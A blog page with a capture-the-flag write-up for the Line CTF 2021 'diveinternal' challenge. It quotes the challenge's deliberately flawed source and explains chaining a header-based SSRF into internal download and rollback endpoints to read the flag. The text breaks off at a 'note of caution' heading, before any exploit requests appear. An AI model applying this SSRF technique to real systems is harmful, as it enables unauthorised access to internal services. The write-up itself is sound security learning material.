@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Jeongwon Jo" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Line CTF 2021 diveinternal Write Up 
+      
+      
+      |
+    
+     Jeongwon Jo
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Pocas</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="https://pocas.kr">
+          <a target="_blank" rel="noopener" href="https://pocas.kr">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Line CTF 2021 diveinternal Write Up</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2021-03-21 23:29:53
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <p><img src="https://github.com/wjddnjs33/image/blob/main/images/linectf.png?raw=true"></p>
+<p>I solved one challenge for web</p>
+<hr>
+<h3 id="Web-diveinternal-50-pts"><a href="#Web-diveinternal-50-pts" class="headerlink" title="(Web) diveinternal [50 pts]"></a>(Web) diveinternal [50 pts]</h3><blockquote>
+<p>The diveinternal challenge is to get a flag using an ssrf vulenrability.</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> request = <span class="built_in">require</span>(<span class="string">&#x27;request&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> querystring = <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> == <span class="string">&#x27;local&#x27;</span>) &#123; <span class="comment">//set the environment value before your running this app</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&#x27;dotenv&#x27;</span>).<span class="title function_">config</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> target = process.<span class="property">env</span>.<span class="property">TARGET_HOST</span>;</span><br><span class="line"><span class="keyword">var</span> test = process.<span class="property">env</span>.<span class="property">TEST</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">headers</span>: req.<span class="property">headers</span>,</span><br><span class="line">    <span class="attr">uri</span>: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/`</span>,</span><br><span class="line">  &#125;, <span class="keyword">function</span>(<span class="params">err, data</span>)&#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;apis&#x27;</span> , <span class="attr">data</span>: data.<span class="property">body</span>&#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/coin&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  <span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">headers</span>: req.<span class="property">headers</span>,</span><br><span class="line">        <span class="attr">uri</span>: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/coin`</span>,</span><br><span class="line">      &#125;).<span class="title function_">pipe</span>(res);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  router.<span class="title function_">get</span>(<span class="string">&#x27;/addsub&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="title function_">request</span>(&#123;</span><br><span class="line">          </span><br><span class="line">          <span class="attr">uri</span>: <span class="string">`http://<span class="subst">$&#123;target&#125;</span>/addsub`</span>,</span><br><span class="line">          <span class="attr">qs</span>: &#123;</span><br><span class="line">            <span class="attr">email</span>: req.<span class="property">query</span>.<span class="property">email</span>,</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;).<span class="title function_">pipe</span>(res);</span><br><span class="line">    &#125;);</span><br><span class="line">  </span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>
+<p>Above code is code of <code>api</code>, I can see that send a request using a <code>$&#123;target&#125;</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TEST=test</span><br><span class="line">TARGET_HOST=localhost:5050</span><br></pre></td></tr></table></figure>
+<p>Also, I can know that send a request to internal server because <code>TARGET_HOST</code> is localhost</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">FROM node:lts-alpine as base</span><br><span class="line"></span><br><span class="line">ADD ./src /src</span><br><span class="line">WORKDIR /src</span><br><span class="line">COPY /src/package*.json /</span><br><span class="line">EXPOSE 3000</span><br><span class="line"></span><br><span class="line">FROM base as production</span><br><span class="line">ENV NODE_ENV=production</span><br><span class="line">ENV TARGET_HOST=private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">RUN npm ci</span><br><span class="line">COPY . /</span><br><span class="line">CMD [&quot;node&quot;, &quot;bin/www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as dev</span><br><span class="line">ENV NODE_ENV=development</span><br><span class="line">ENV DEBUG=frontend:*</span><br><span class="line">ENV TARGET_HOST=private:5000</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . /</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin/www&quot;]</span><br><span class="line"></span><br><span class="line">FROM base as local</span><br><span class="line">ENV NODE_ENV=development</span><br><span class="line">ENV DEBUG=frontend:*</span><br><span class="line">ENV TARGET_HOST=localhost:5050</span><br><span class="line">RUN npm install -g nodemon &amp;&amp; npm install</span><br><span class="line">COPY . /</span><br><span class="line">CMD [&quot;nodemon&quot;, &quot;bin/www&quot;]</span><br></pre></td></tr></table></figure>
+<p>When I check a docker file, I can know to was open a 5050&#x2F;5000 port. Viz, I can able use a <code>localhost:5050</code>, <code>localhost:5000</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RunRollbackDB</span>(<span class="params">dbhash</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br></pre></td></tr></table></figure>
+<p>And first, when I see an important flag reading condition, If environment of server is not <code>Local</code> and exist a file called <code>&#39;backup/&#39; + dbhash</code>, retrun a flag.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/coin&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">coin</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = app.response_class()</span><br><span class="line">        language = LanguageNomarize(request)</span><br><span class="line">        response.headers[<span class="string">&quot;Lang&quot;</span>] =  language</span><br><span class="line">        data = getCoinInfo()</span><br><span class="line">        response.data = json.dumps(data)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br></pre></td></tr></table></figure>
+<p>First, I can see that when <code>api</code> server send a request to <code>/coin</code> , put a result value of <code>LanguageNomarize()</code> function to header called <code>Lang</code> and to reponse after bring an information of coin using a <code>getCoinInfo()</code> function.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">LanguageNomarize</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;en&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        regex = <span class="string">&#x27;^[!@#$\\/.].*/.*&#x27;</span> <span class="comment"># Easy~~</span></span><br><span class="line">        language = request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        language = re.sub(<span class="string">r&#x27;%00|%0d|%0a|[!@#$^]|\.\./&#x27;</span>, <span class="string">&#x27;&#x27;</span>, language)</span><br><span class="line">        <span class="keyword">if</span> re.search(regex,language):</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = requests.get(request.host_url+language, headers=request.headers)</span><br><span class="line">            <span class="keyword">if</span> data.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> data.text</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> request.headers.get(<span class="string">&#x27;Lang&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>When I see a <code>LanguateNomarize()</code> function, If to exist a header called <code>Lang</code>, confirm a value of header using regular expression, and I can see to send a request using a <code>request.get()</code> function. In here, Occur an <code>ssrf</code> vulnerability because I can send a request of where I want after modifying a <code>request.host_url</code> and <code>language</code>.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/integrityStatus&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">integritycheck</span>():</span><br><span class="line">    data = &#123;<span class="string">&#x27;db&#x27;</span>:<span class="string">&#x27;database/master.db&#x27;</span>,<span class="string">&#x27;dbhash&#x27;</span>:activity.dbHash&#125;</span><br><span class="line">    data = json.dumps(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
+<p>Second, I’ll check the <code>/integrityStatus</code>. We usually can’t send a request because <code>/integrityStatus</code> not communicating to <code>api</code> server. But I can find a value of <code>dbhash</code> by making a request to <code>/integrityStatus</code> using an <code>ssrf</code> vulnerability.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rollback&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rollback</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Key&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">        result  = activity.IntegrityCheck(request.headers.get(<span class="string">&#x27;Key&#x27;</span>),request.args.get(<span class="string">&#x27;dbhash&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        err = <span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno)</span><br><span class="line">        logger.error(err)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;error&#x27;</span>]), <span class="number">404</span></span><br></pre></td></tr></table></figure>
+<p>Third, I can see that when I see a <code>/rollback</code>, If value of <code>SignCheck()</code> is true and exist a value of header called <code>Key</code>, call an <code>IntegrityCheck()</code> method.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">IntegrityCheck</span>(<span class="params">self,key, dbHash</span>): </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.integrityKey == key:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> self.dbHash != dbHash:</span><br><span class="line">        flag = RunRollbackDB(dbHash)</span><br><span class="line">        logger.debug(<span class="string">&#x27;DB File changed!!&#x27;</span>+dbHash)</span><br><span class="line">        file = <span class="built_in">open</span>(os.environ[<span class="string">&#x27;DBFILE&#x27;</span>],<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">        self.dbHash = hashlib.md5(file).hexdigest()</span><br><span class="line">        self.integrityKey = hashlib.sha512((self.dbHash).encode(<span class="string">&#x27;ascii&#x27;</span>)).hexdigest()</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;DB is safe!&quot;</span></span><br></pre></td></tr></table></figure>
+<p>When I see the <code>IntegrityCheck()</code> method, the value of <code>self.integrityKey</code> and the value of <code>Key</code> are the same, and if the value of <code>self.dbHash</code> and <code>dbHash</code> are not the same, I can see that the <code>RunRollbackDB()</code> function is executed.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RunRollbackDB</span>(<span class="params">dbhash</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> os.environ[<span class="string">&#x27;ENV&#x27;</span>] == <span class="string">&#x27;LOCAL&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> dbhash <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dbhash is None&quot;</span></span><br><span class="line">        dbhash = <span class="string">&#x27;&#x27;</span>.join(e <span class="keyword">for</span> e <span class="keyword">in</span> dbhash <span class="keyword">if</span> e.isalnum())</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(<span class="string">&#x27;backup/&#x27;</span>+dbhash):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                flag = f.read()</span><br><span class="line">                <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Where is file?&quot;</span></span><br><span class="line">                </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e :</span><br><span class="line">        logger.error(<span class="string">&#x27;Error On  &#123;f&#125; : &#123;c&#125;, Message, &#123;m&#125;, Error on line &#123;l&#125;&#x27;</span>.<span class="built_in">format</span>(f = sys._getframe().f_code.co_name ,c = <span class="built_in">type</span>(e).__name__, m = <span class="built_in">str</span>(e), l = sys.exc_info()[-<span class="number">1</span>].tb_lineno))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;exception!!&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+<p><code>RunRollbackDB()</code> is a function that reads and returns a <code>FLAG</code> file if the <code>backup/dbhash</code> file exists, as seen above.</p>
+<p>So I thought with the following scenario at first</p>
+<ul>
+<li>Scenario 1</li>
+</ul>
+<ol>
+<li>Using <code>ssrf</code> vulnerability to send a request to <code>/integrityStatus</code> to get the value of dbHash.</li>
+<li>Read the FLAG by sending a request to <code>/rollback</code> using the retrieved value of <code>dbHash</code>.</li>
+<li>FLAG is returned as a header value of lang.</li>
+</ol>
+<p>However, an exploit was attempted using the above scenario, but the attack could not be performed because the value of self.dbHash and <code>dbHash</code> in the <code>IntegrityCheck()</code> function had to be different.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">WriteFile</span>(<span class="params">url</span>):</span><br><span class="line">    local_filename = url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">with</span> requests.get(url, stream=<span class="literal">True</span>) <span class="keyword">as</span> r:</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;backup/&#x27;</span>+local_filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> chunk <span class="keyword">in</span> r.iter_content(chunk_size=<span class="number">8192</span>): </span><br><span class="line">                f.write(chunk)</span><br></pre></td></tr></table></figure>
+<p>So, when I analyzed the code again, I could see that the <code>WriteFile()</code> function was used to create a file under <code>backup/</code>. So, if you create any file using <code>WriteFile</code> function and send the name of the file to <code>dbHash</code>, it is not the same as the value of <code>self.dbHash</code>, which is a variable in the class, and it is Because it exists, it is enough to bypass it and read the flags.</p>
+<p>When I see inside the <code>WriteFile()</code> function, a request is sent using the <code>requests.get()</code> function, and the value of <code>url.split(&#39;/&#39;)[-1]</code> is used as the file name to create it.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/download&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;Sign&#x27;</span>) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> SignCheck(request):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status[<span class="string">&#x27;sign&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            src = request.args.get(<span class="string">&#x27;src&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> valid_download(src):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">elif</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> valid_download(request.form[<span class="string">&#x27;src&#x27;</span>]):</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;false&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        WriteFile(src)</span><br><span class="line">        <span class="keyword">return</span> json.dumps(status.get(<span class="string">&#x27;success&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<p>The <code>WriteFile()</code> function is called from <code>/download</code>. At this time, if the header value <code>Sign</code> exists, the return value of the <code>SignCheck()</code> function is true, and the <code>src</code> parameter value exists, <code>WriteFile()</code> function is executed.</p>
+<ul>
+<li>Scenario 2</li>
+</ul>
+<ol>
+<li>Using the <code>ssrf</code> vulnerability, a request was sent to <code>/download</code> to create a random file.</li>
+<li>Again, using the <code>ssrf</code> vulnerability, sending a request to <code>/rollback</code> to read the FLAG</li>
+<li>In this case, the <code>self.dbHash != dbHash</code> syntax is bypassed by using the file name.</li>
+<li>Finally, just read the <code>Lang</code> header.</li>
+</ol>
+<ul>
+<li>A note of caution</li>
+</ul>
+<ol>
